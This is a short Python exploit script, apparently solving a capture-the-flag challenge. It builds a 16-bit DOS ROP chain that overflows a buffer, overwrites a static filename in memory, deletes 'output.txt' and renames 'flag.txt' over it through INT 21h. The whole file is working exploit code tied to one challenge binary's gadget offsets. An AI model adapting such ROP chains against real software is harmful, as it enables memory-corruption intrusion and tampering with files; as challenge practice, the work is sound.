#!/usr/bin/env python3
import base64
from struct import pack

p16 = lambda x: pack("<H", x & 0xffff)
# offsets / funcs / gadgets
RET_OFF = 0x14
SAFE_BP = 0x0500

SET_AX  = 0x1e8b    # pop ax; add ax,0xb4; pop di; pop si; pop bp; ret
ES_DS   = 0x0640    # push ds; pop es; ...; ret
STOSB   = 0x0d38    # stosb; ret
UNLINK  = 0x0d0c
POPBX   = 0x0d98
POP_DCB = 0x0d96    # pop dx; pop cx; pop bx; ret
POPDI   = 0x0d5f
INT21   = 0x0275
EXIT    = 0x0197

INPUT_TXT  = 0x00aa   # "input.txt"
OUTPUT_TXT = 0x00c4   # "output.txt"

def set_ax(v, di=0x4141, si=0x4141, bp=SAFE_BP):
    return p16(SET_AX) + p16(v - 0xb4) + p16(di) + p16(si) + p16(bp)

payload  = b'a\x1aFLAG.TXT\x00'
payload += b"A" * (RET_OFF - len(payload))

# ES = DS
payload += set_ax(0x4141)
payload += p16(ES_DS)

# overwrite static "input.txt" -> "flag.txt\x00"
for i, c in enumerate(b"flag.txt\x00"):
    payload += set_ax(c, di=INPUT_TXT + i)
    payload += p16(STOSB)

# unlink("output.txt")
payload += p16(UNLINK)
payload += p16(POPBX)
payload += p16(OUTPUT_TXT)

# DOS rename("flag.txt", "output.txt")
payload += set_ax(0x5600)        # AH = 0x56
payload += p16(POP_DCB)
payload += p16(INPUT_TXT)        # DS:DX = "flag.txt"
payload += p16(0x4141)
payload += p16(0x4141)
payload += p16(ES_DS)            # ES = DS
payload += p16(POPDI)
payload += p16(OUTPUT_TXT)       # ES:DI = "output.txt"
payload += p16(INT21)

payload += b" "

print(base64.b64encode(payload).decode())